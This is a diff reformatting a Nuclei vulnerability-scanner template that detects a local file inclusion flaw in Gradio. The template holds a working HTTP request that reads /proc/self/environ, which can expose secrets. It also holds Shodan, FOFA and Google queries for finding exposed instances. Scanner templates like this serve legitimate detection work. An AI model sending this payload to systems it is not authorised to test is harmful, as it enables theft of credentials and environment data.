@@ -1,5 +1,4 @@
 id: gradio-lfi
-
 info:
   name: Gradio - Local File Inclusion
   author: ritikchaddha
@@ -11,46 +10,42 @@ info:
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-20
+    cwe-id: CWE-20,CWE-22,CWE-73
   metadata:
-    max-request: 1
-    vendor: gradio_app
-    product: gradio
-    shodan-query:
-      - http.html:"__gradio_mode__"
-      - http.title:"gradio"
+    runzero-match: service["http.body"] matches "(?i)__gradio_mode__" || any(each(service["html.titles"]), {# matches "(?i)gradio"})
     fofa-query:
       - body="__gradio_mode__"
       - title="gradio"
     google-query: intitle:"gradio"
-  tags: lfi,gradio,file-inclusion
-
+    max-request: 1
+    product: gradio
+    shodan-query:
+      - http.html:"__gradio_mode__"
+      - http.title:"gradio"
+    vendor: gradio_app
+  tags: file-inclusion,gradio,lfi
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - 'url":'
+          - path":"
+          - data":[{
+          - FileData
+      - part: content_type
+        type: word
+        words:
+          - application/json
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /run/predict HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
 
         {"data":["{\"path\":\"/proc/self/environ\"}"],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"ig8gs2fazn"}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - 'url":'
-          - 'path":"'
-          - 'data":[{'
-          - 'FileData'
-        condition: and
-
-      - type: word
-        part: content_type
-        words:
-          - application/json
-
-      - type: status
-        status:
-          - 200
-# digest: 490a00463044022061514a06a61e9b258ca96bf387995ba18354efd17ec6ad6a4ae842e17d2e278c02204ad249bdae5d231cafc6109a2dde502e8b7eb2af18f109c6ff32f5b60853e093:922c64590222798bb761d5b6d8e72950
